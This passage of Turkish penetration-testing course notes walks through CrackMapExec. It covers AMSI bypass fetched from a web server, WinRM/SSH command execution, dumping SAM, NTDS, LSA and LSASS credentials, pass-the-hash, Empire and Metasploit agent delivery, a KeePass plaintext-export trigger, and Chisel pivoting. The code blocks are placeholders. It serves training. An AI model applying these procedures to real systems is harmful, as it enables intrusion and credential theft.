Bu teknikler `PowerShell` çalıştırılırken algılanabilir. Özel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seçeneğini ve ardından kullanmak istediğimiz payload'un yolunu kullanabiliriz. Örneğin, [AMSI Bypass Değiştirilmiş Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) Yamasını kullanalım. Bunu bir dosyaya kaydedeceğiz ve bu AMSI Bypass'ı bir web sunucusundan belleğe yüklemek için bir PowerShell scripti oluşturacağız. İşte adımlar:

*  “Modified Amsi ScanBuffer Patch” içeren dosyayı indirin


### “Modified Amsi ScanBuffer Patch” ile Bir Dosya Oluşturun

{{CODE_BLOCK_156}}


Payload'u olduğu gibi çalıştırmaya çalışırsak, komut maksimum uzunluk olan 8191 karakteri aşacağı için başarısız olacaktır

### Komut Maksimum Uzunluğu Aşıyor

{{CODE_BLOCK_157}}

* Bu sorunu çözmek için, `shantanukhande-amsi.ps1` dosyasını indiren ve çalıştıran bir PowerShell scripti oluşturalım. Ayrıca scriptimizi barındırmak için bir Python web sunucusu oluşturmamız gerekecek.

### PowerShell Komut Dosyasını Oluşturma ve Barındırma

{{CODE_BLOCK_158}}


Not: Sonuna noktalı virgül (;) eklediğinizden emin olun.

Başka bir terminalden, yeni AMSI bypass payload'umuzu çalıştıralım:

### PowerShell Özel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut Yürütme

WinRM protokolü ile de komutları çalıştırabiliriz. Varsayılan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yı dinler. Bu protokolle ilgili özel bir şey, bir kullanıcının komutları yürütmek için `administrator` olmasını gerektirmemesidir. `Administrators` grubunun üyesiysek, `Remote Management Users` grubunun üyesiysek veya oturum yapılandırmasında açık `PowerShell Remoting` izinlerimiz varsa WinRM protokolünü kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yürütme ile kullanabileceğimiz çeşitli seçenekler vardır. Bunlardan bazılarını görelim:

| Seçenek           | Açıklama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM bağlantısı için özel bir port seçmek.             |
| --ssl             | SSL etkinleştirilmiş WinRM'ye bağlanmak.                |
| --ignore-ssl-cert | SSL ile bağlanırken sertifika doğrulamasını yok saymak. |

Not: WinRM protokolü farklı yürütme yöntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows üzerinde komutları çalıştırmak için SSH protokolünü de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileşime girmenin bir başka yaygın yolu da `public` ve `private` keyleri kullanmaktır. CrackMapExec, `--key-file` seçeneği ile `private key` kullanımını destekler. Anahtarın çalışması için `OPENSSH` formatında olması gerekir.

### Private Key Kullanarak SSH ile Komut Yürütme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapılandırılmamışsa, `-p` seçeneğini boş `(“”)` olarak ayarlamalıyız, aksi takdirde bir hata alırız

Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.


### Gizli Bilgileri Bulma ve Kullanma

Parola çıkarma söz konusu olduğunda, CrackMapExec oldukça güçlüdür. On workstation ele geçirdiğimizi ve tümünden kimlik bilgilerini almak için LSASS process'inin belleğini dump istediğimizi düşünelim; CrackMapExec bunu yapabilir.

Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dump için sunduğu yöntemleri inceleyeceğiz.


### SAM

SAM database, tüm local kullanıcıların kimlik bilgilerini içerir ve birçok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandığı için bunları ele geçirmek kritik öneme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanılabilen `--sam` seçeneğini kullanarak SAM database içeriğini hızlı bir şekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı objeleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz

Hash'leri dump etmek için `--ntds` seçeneğini kullanmamız gerekir, aşağıdaki örnekte `robert` kullanıcısı bir Domain Admin değildir, ancak `replikasyon` gerçekleştirme ayrıcalıklarına sahiptir.

### Domain Controller üzerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seçeneğini kullanırken `--user` ve `--enabled` seçeneklerini dahil edebiliriz. Eğer `--user` kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dump alalım.

### Yalnızca KRBTGT Hesabının Dump Edilmesi

{{CODE_BLOCK_166}}

Eğer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.


### Yalnızca Enabled Hesapları Gösterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için `Pass the Hash` tekniğini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren `-H` seçeneğine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent çalıştırmadan hash dump işlemi gerçekleştiren `impacket-secretsdump`'tan alınmış `--lsa` seçeneğiyle birlikte gelir. Bu seçenek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak üzere LSA Secrets'ı dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır


### LSA'yı inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile başlayan hash formatı `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayıf bir parola belirlenmişse `Hashcat` kullanılarak kırılabilir çünkü bu algoritma `NTLM`'den çok daha güçlüdür. Ayrıca, Domain Cached Credential hash'leri `Pas the Hash` saldırısı için kullanılamaz. Bunları kırmak için, domain ve kullanıcı adını kaldırmamız, `$DCC2$` 'den sonraki değeri almamız ve Hashcat modül 2100'ü kullanmamız gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleği, Windows parolalarını `açık metin` olarak veya `NTLM` veya `AES256/AES128` gibi diğer hash biçimlerini içerir. Belleği dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak için etkili bir yol olabilir.

CrackMapExec, LSASS process belleğinin içeriğini dump etmek için çeşitli modüller içerir. Bunlardan bazılarını görelim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracı, bir dizi host üzerindeki kimlik bilgilerini remote olarak ayıklamak için kullanılır. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazısı nasıl çalıştığını açıklamaktadır. Bu araç, bir LSASS dump'ındaki gerekli baytları remote okumak için `Impacket` projesini ve kimlik bilgilerini çıkarmak için `pypykatz` kullanır.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluşturmak için Sysinternals'tan Microsoft `Procdump`'ı ve kimlik bilgilerini çıkarmak için `pypykatz`'ı kullanır.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracı, **LSASS**'e ait kopyalanmış **handle**'ların kullanımını göstererek, aynı **process**'in **gizlenmiş** bir bellek dump'ını oluşturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'ını oluşturan esnek bir araçtır. **LSASS**'e bir **handle** açmak tespit edilebileceğinden, **Nanodump** mevcut **handle**'ları arayabilir. Eğer bir **handle** bulunursa, bunu kopyalayıp **minidump** oluşturmak için kullanır. Ancak, böyle bir **handle** bulunacağının garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bölgesi veya başka bir kaynak** ile etkileşime geçmesini sağlayan **benzersiz bir tanımlayıcıdır**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bölümde bir bilgisayardan veya domain'den kimlik bilgilerini almak için farklı yöntemler gösterilmektedir. Bir sonraki bölümde CrackMapExec'in bir C2 framework ile birlikte kullanımı incelenecektir.

---


### Bir **C2 Framework** içinde **session**'ları alma.

CrackMapExec ile ilginç olabilecek bir şey, birden fazla hedefi tehlikeye attığımızda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak çalışmak isteyebiliriz. Her hedef makinede bir payload çalıştırmak ve C2'mize bir `agent` almak için CrackMapExec'i kullanabiliriz.

Bu bölümde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modül ele alınacaktır. Ayrıca farklı bir C2 framework'ü kullanırsak bir alternatif de keşfedeceğiz.


### Empire

Web sitelerinde sağlanan [kılavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'ü yükleyerek başlayacağız


### Empire Server'ı Kurun ve Başlatın

{{CODE_BLOCK_176}}

Daha sonra Empire'ı seçtiğimiz kullanıcı adı ve şifre ile çalıştırmamız gerekiyor. Biz `empireadmin` kullanıcı adını ve `asdasd123` şifresini kullanacağız! .


### Empire'ı Özel Kullanıcı Adı ve Parola ile Çalıştırma

{{CODE_BLOCK_177}}

Ardından, CrackMapExec yapılandırma dosyasını ve Empire client yapılandırma dosyasını seçtiğimiz kullanıcı adı ve parolayla eşleşecek şekilde düzenlememiz gerekir.

CrackMapExec yapılandırma dosyası varsayılan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seçeneğini `empireadmin` kullanıcı adı ve `asdasd123` şifresiyle eşleşecek şekilde değiştirmemiz gerekiyor! . Varsayılan olarak, Empire local server `1337` portunda çalışır. CrackMapExec yapılandırma dosyasında değiştirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


Aynı şeyi Empire yapılandırma dosyası için de yapmamız gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### İnceleme

{{CODE_BLOCK_179}}


Yapılandırma dosyaları değiştirildikten sonra, Empire client ile Empire sunucusuna bağlanmalıyız

{{CODE_BLOCK_180}}

Şimdi listener'ı ayarlamamız gerekiyor ve host'u IP adresimize ve Port'u da aracının bağlanacağı TCP 8001'e ayarlayacağız.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

Artık listener'ımız çalışıyor ve `empire_exec` modülü ile Empire'a bir `agent` almak için CrackMapExec'i kullanabiliriz. Ayarladığımız listener olan `LISTENER=http` seçeneğini eklememiz gerekiyor.


### CrackMapExec Modülünü Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu çalıştırdığımızda, PowerShell Empire'da yeni bir agent görmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

Aynı şeyi CrackMapExec modülü `web_delivery` kullanarak Metasploit Framework üzerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modülünü yapılandırmamız ve sağlanan URL'yi CrackMapExec modülümüze bir parametre olarak kullanmamız gerekir. Msfconsole'u başlatalım ve `web_delivery` handler'ını yapılandıralım


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapılandırıldıktan sonra web_delivery modülünü kullanabiliriz. `URL` ve `PAYLOAD` olmak üzere iki seçeneği destekler. URL seçeneğini Metasploit tarafından sağlanan URL ile ayarlamamız gerekir ve PAYLOAD seçeneği seçtiğimiz payload mimarisine karşılık gelir. Eğer `x64` kullanıyorsak, `x64` varsayılan değer olduğu için bu seçeneği atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. Eğer `32 bit` payload kullanıyorsak `PAYLOAD=32` seçeneğini ayarlamamız gerekir. Şimdi bunu çalışırken görelim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum görmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

Başka bir C2 Framework kullanmak istediğimizde, **Command Execution** bölümünde bahsedilen (SMB, WinRM, SSH) yöntemleri kullanarak aynı sonucu elde edebiliriz. Örneğin, bir **PowerShell** payload'u oluşturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip çalıştırmak için **-X** seçeneğiyle bir PowerShell komutu çalıştırabiliriz. Ayrıca, işlemi arka planda yürütmek için **`--no-output`** seçeneğini seçmemiz gerekecektir.

Örnek olarak Metasploit'i kullanalım ve modülü kullanmak yerine web_delivery payload'unda sağlanan PowerShell script'ini kopyalamayı deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bölüm, CrackMapExec'i C2 Frameworks gibi diğer bilgisayar korsanlığı araçlarıyla nasıl kullanabileceğimizi araştırıyor. Bir sonraki bölümde CrackMapExec'in BloodHound ile nasıl entegre edileceği incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldırganlar hem de savunmacılar tarafından alan güvenliğini analiz etmek için kullanılan açık kaynaklı bir araçtır. Araç, domain'den toplanan büyük miktarda veriyi alır. İlişkiyi görsel olarak temsil etmek ve geleneksel numaralandırma ile tespit edilmesi zor veya imkansız olan domain saldırı yollarını belirlemek için grafik teorisini kullanır. Bu bölümde Bloodhound'a aşina olduğunuzu varsayıyoruz. 


### **BloodHound**'da **Owned** olarak işaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geçirilmiş (owned) olarak işaretleyebiliriz. Bunu yapmak için node'a sağ tıklayıp **`Mark X as Owned`** seçeneğine tıklamamız yeterlidir. Bu, ele geçirdiğimiz kullanıcıları ve bilgisayarları takip etmek açısından faydalıdır, özellikle büyük bir organizasyonla çalışırken. Ayrıca, **`Shortest Path from Owned Principals`** (Ele Geçirilmiş Principal'dan En Kısa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele Geçirilmiş Principal'dan Domain Adminlerine En Kısa Yollar) gibi bir BloodHound cypher sorgusu gerçekleştirmek istediğimizde de kullanışlıdır.

CrackMapExec'i, ele geçirdiğimiz herhangi bir user veya computer'ı BloodHound veritabanında `owned` olarak işaretleyecek şekilde yapılandırabiliriz. Bunu yapmak için, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapılandırma dosyasını aşağıdaki seçeneklerle değiştirmemiz gerekir:

* Bloodhound yapılandırma seçeneği `bh_enabled`'ı `True` olarak ayarlayın.
* `bh_uri`'yi Bloodhound veritabanı `IP` adresimize ayarlayın.
* `bh_port`'u veritabanı `portuna` ayarlayın
* Kimlik bilgilerini bloodhound veritabanıyla eşleşecek şekilde ayarlayın: kullanıcı adı `neo4j` ve şifre `asdasd123` (Veritabanınıza karşılık geleni kullandığınızdan emin olun).

Yapılandırma aşağıdaki gibi görünmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: Bağlandığınız BloodHound veritabanına karşılık gelen kullanıcı adı ve parolayı kullandığınızdan emin olun.

### Bloodhound Verilerinin Toplanması

BloodHound verilerini toplamak için CrackMapExec kullanarak SharpHound'u çalıştıracak ve ardından dosyayı saldırı hostumuza aktaracağız.

### BloodHound verilerinin toplanması

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Şimdi BloodHound'u açmamız ve verileri içe aktarmamız gerekiyor.


### BloodHound'da Kullanıcıları Owned Olarak Ayarlama

Veriler içe aktarıldıktan sonra, `robert` kullanıcısı ile bağlanmaya çalışırsak, kullanıcıyı BloodHound veritabanında owned olunan olarak ayarlayacaktır.

### Kullanıcı BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanıcısı olan bir makineyi tehlikeye atarsak da aynı şey olacaktır. Bulunan tüm yeni kullanıcıları owned olarak ayarlayacaktır.

### Procdump Modülü ile Kullanıcıları Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: Tüm CrackMapExec seçenekleri BloodHound veritabanı ile senkronize olmayacaktır. Örneğin, `--ntds` veya `--lsa` seçeneklerini denersek, kullanıcıları veritabanında sahip olunan olarak işaretlemez, ancak `procdump` veya `lsassy` gibi modüller kullanıcıları sahip olunan olarak işaretler.


### BloodHound'da Bilgisayarları Owned Olarak Ayarlama

Yazım sırasında, BloodHound entegrasyonu yalnızca user'ları Owned olarak işaretlemektedir. Bir `computer` owned olarak işaretlemek istiyorsak, `bh_owned` modülünü ve `neo4j` veritabanımızın kullanıcı adı ve şifresini kullanabiliriz. Aşağıdaki örnekte, diğer varsayılan değerler neo4j veritabanımızla eşleştiği için yalnızca `PASS` seçeneğini ekleyeceğiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, büyük ağlarla uğraşırken birçok seçenek sunar ve müşterilerimizle paylaşmak istememiz durumunda veritabanını güncellemenin hızlı bir yoludur. Bir sonraki bölümde, CrackMapExec'te mevcut olan bazı popüler modüllerle çalışacağız.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici şeylerden biri, modüler olması ve herkesin modüller oluşturmasına ve bunları araca katkıda bulunmasına izin vermesidir. CrackMapExec, exploit ve exploit sonrası görevleri kolaylaştırmak için işlemler gerçekleştirmemizi sağlayan 50'den fazla modüle sahiptir. Bu bölümde LDAP ve SMB protokolleri için bu modüllerden bazıları incelenecektir.


### LDAP Protocol Modules

LDAP protokolü yaygın olarak Domain Controller'lar ile etkileşime geçmemizi ve onlardan bilgi almamızı sağlar. Active Directory'den ilginç bilgiler çıkarmamızı sağlayacak bazı modülleri gözden geçirelim.


### **LDAP Module - get-network**

`get-network` modülü [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'ı  temel alır. Varsayılan olarak, Active Directory'deki herhangi bir kullanıcı, `zone transferine` benzer şekilde Domain veya Forest DNS bölgelerindeki tüm DNS kayıtlarını numaralandırabilir. Bu araç, internal ağların yeniden yapılandırılması amacıyla bölgedeki tüm DNS kayıtlarının numaralandırılmasını ve dışa aktarılmasını sağlar.

Modülü kullanmanın üç (3) yolu vardır:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adları).

Varsayılan olarak, herhangi bir seçenek belirtmezsek, modül yalnızca IP adresini alacaktır. `ALL=true` seçeneğini seçersek, hem IP hem de domain adlarını alır ve `ONLY_HOSTS=true` olarak belirtirsek, yalnızca FQDN'yi alırız.


### DNS Sunucusundan (Record) Kayıtları Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazının yazıldığı zamanda, modül **`adidnsdump`** aracıyla bazı farklılıklar göstermektedir. Sonuçlar, hesaplar arasında farklılık gösterebilir.


### LDAP Module - laps

Bir başka harika modül de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e bağlı bilgisayarlarda local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL'ler tarafından korunur, böylece yalnızca belirli kullanıcılar bunları okuyabilir veya `parola sıfırlama` talebinde bulunabilir. Laps modülü ile bir hesabın okuma erişimine sahip olduğu tüm bilgisayarları alabiliriz. Bir bilgisayarı belirtmek için `COMPUTER` seçeneğini de kullanabilir veya benzer ada sahip birkaç bilgisayarı almak için bir wildcard karakterle birlikte kullanabiliriz.


### LAPS Modülü Parolaların Alınması

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: Kullanılan parola bir örnektir. Hedef hostta çalışmayacaktır

### LDAP Modülü - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'ü ile temsil edilen ve varsayılan olarak bir **user**'ın bir **domain** içinde oluşturabileceği **computer account** sayısını belirten bir **domain level attribute**'tür.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazı **attack** senaryolarında **domain** içinde bir **machine** oluşturmak gerekebilir, bu yüzden **account machine quota attribute**'ünü **enumerate** etmek önemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir başka harika modül ise bir veya birden fazla object'in `DACL`'lerini okumamızı ve dışa aktarmamızı sağlayan `daclread`'dir. Bu modül Active Directory erişimini numaralandırmamızı sağlayacaktır. Aşağıdaki seçeneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabının tüm **ACE**'lerini okumak istiyoruz. Bunun için **`TARGET`** seçeneğini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace Kullanıcısının DACL'sini Oku

{{CODE_BLOCK_203}}


Ayrıca belirli hakları da arayabiliriz, örneğin hangi **principal**'ların **DCSync** haklarına sahip olduğunu. Bunun için **`TARGET_DN`** seçeneğini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seçeneğini seçmemiz ve aramak istediğimiz hakları **`RIGHTS`** seçeneğiyle belirlememiz gerekir.

### DCSync Rights'a Sahip Kullanıcıları Arama

{{CODE_BLOCK_204}}



Çıktıda gösterildiği gibi, `ACE[4]` `robert` kullanıcısının hedef domain'de `DCSync` haklarına sahip olduğunu gösterir.

LDAP'ta birkaç modül daha kullanabiliriz. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolünde daha fazla modül mevcuttur. CrackMapExec modülünde yaptığımız şeylerin çoğu SMB protokolünü kullanır. İlginç bilgiler elde etmemizi sağlayacak bazı modülleri gözden geçirelim.

Not: SMB kullanan modüllerin çoğunun çalışması için admin haklarına ( `Pwned!` ) ihtiyaç vardır.


### SMB Modülleri - get_netconnections ve ioxidresolver

Bir ağ pentesti üzerinde çalışırken, sürekli olarak daha fazla kaynağa veya ağa erişim elde etmeye çalışırız. CrackMapExec, daha önce tehlikeye attığımız bir makineyi numaralandırmamıza ve birden fazla ağ yapılandırmasına sahip olup olmadığını belirlememize olanak tanıyan bazı modüllere sahiptir. `get_netconnections` ve `ioxidresolver` modüllerini kullanalım ve farklarını görelim.

`get_netconnections` modülü, ağ bağlantılarını sorgulamak için `WMI` kullanır. `IPv6` ve herhangi bir ikincil IP dahil olmak üzere tüm IP adreslerinin yanı sıra domain adını da alır.


### get_netconnections Module

{{CODE_BLOCK_206}}


Öte yandan, `ioxidresolver` modülü IP adreslerini sorgulamak için RPC kullanır. Ancak, bu modül `IPv6` adreslerini içermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: İhtiyaçlarımıza en uygun olanı seçebilmemiz için bir modülün nasıl çalıştığını anlamak önemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal ağlarda adminler ve kullanıcılar tarafından parolaları ve gizli bilgileri tek bir veritabanında saklamak için yaygın olarak kullanılan ücretsiz, açık kaynaklı bir password manager'dır. Bir master password onu korur. Bir KeePass veritabanı alırsak, onu açmak için şifresine ihtiyacımız vardır.

### KeePass'i Keşfetme

{{CODE_BLOCK_208}}

Eğer master parolaya sahip değilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafından geliştirilen ve veritabanını açık metin olarak dışa aktarmak için KeePass'ın triger sistemini kullanan bir teknik kullanmaktır. KeePass yapılandırma dosyasını, veritabanını otomatik olarak açık metin olarak dışa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) içerecek şekilde değiştirir.

Bunu kullanmak için beş (5) adıma ihtiyacımız var:

*  KeePass yapılandırma dosyasını bulun. Biz bunu `keepass_discover` modülü ile yaptık.
 * `ACTION=ADD` seçeneğini ve `KEEPASS_CONFIG_PATH` öğesini kullanarak trigger'ı yapılandırma dosyasına ekleyin.

### KeePass Yapılandırma Dosyasına Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapılandırma yolu için ters eğik çizgi (`/`) veya çift eğik çizgi (`\`) kullandığınızdan emin olun.

* Kullanıcının KeePass'i açmasını ve master parolayı girmesini bekleyin. Bu işlemi zorlamak için `ACTION=RESTART` seçeneğini kullanarak KeePass.exe prosesini yeniden başlatabiliriz. Hedef makinede oturum açmış çok sayıda kullanıcı varsa, `USER=julio` gibi kullanıcı adı ile `USER` seçeneğini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seçeneğini kullanarak export edilen veritabanını makinemize sorgulayın. Daha sonra şifre girişlerini aramak için grep kullanabiliriz.


### Ele Geçirilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seçeneğini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapılandırma dosyasını temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modülün her seçeneğini öğrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seçeneğin iyi yanı, **extract_password** yöntemini de içermesidir; bu yöntem **.xml** dosyasında herhangi bir parola girişini arar ve konsola yazdırır.


### keeppass_trigger TÜMÜNÜ Tek Komutta Çalıştırma

{{CODE_BLOCK_214}}

Not: Modül şifreyi yazdırırken sorun yaşayabilir. Bir hata alabiliriz, ancak şifre `/tmp/export.xml` dosyasında olacaktır, böylece manuel olarak alabiliriz.

### RDP'yi Etkinleştirme veya Devre Dışı Bırakma

Değerlendirme yaparken yapmak isteyebileceğimiz yaygın bir görev, RDP aracılığıyla bir hedef makineye bağlanmaktır. Bu, başka türlü lateral hareket saldırıları gerçekleştiremediğimiz veya standart bir protokol kullanarak radarın altından geçmek istediğimiz bazı senaryolarda yararlı olabilir.

Bağlanmak istediğimiz makinede RDP etkin değilse, buna izin vermek için RDP modülünü kullanabiliriz. `ACTION` seçeneğini ve ardından `enable` veya `disable` seçeneklerini belirtmemiz gerekir.


### RDP'yi Etkinleştirme

{{CODE_BLOCK_215}}


SMB'de birkaç modül daha vardır. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bölümde, ZeroLogon gibi bilinen güvenlik açıklarından yararlanan diğer SMB modüllerine bakacağız

### Vulnerability Scan Modules

Sızma testi yaparken gerçekleştirdiğimiz günlük faaliyetlerden biri güvenlik açıklarını tespit etmeye çalışmaktır. Eğer herhangi birini bulabilirsek, exploitation işi basit olabilir.

CrackMapExec, güvenlik açıklarını tespit etmemizi sağlayan bazı modüller içerir. Bu oturumda bunlardan bazılarını inceleyeceğiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geçirdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki ağ kartı var ve amacımız domainin saldırıya karşı savunmasız olup olmadığını belirlemek. Domainin IP adresi `172.16.10.3`'tür.

Domain'e erişim sağlamak için, CME ile ProxyChain bölümünde öğrendiklerimizi kullanacağız ve Chisel ile bir bağlantı kuracağız


### Chisel'i Hedef Makineye Gönderme

{{CODE_BLOCK_217}}


### Saldırı Hostumuzda Chisel'ı Sunucu Olarak Çalıştırma

{{CODE_BLOCK_218}}


### Chisel'ı Tehlikeye Düşmüş Cihazdan Saldırı Hostumuza Bağlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki güvenlik açığı modüllerinin çoğu yalnızca kontrol edilir ve bu modülleri güvenlik açıklarından yararlanmak için kullanamayız. [ZeroLogon güvenlik açığı](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile başlayalım.


### ZeroLogon

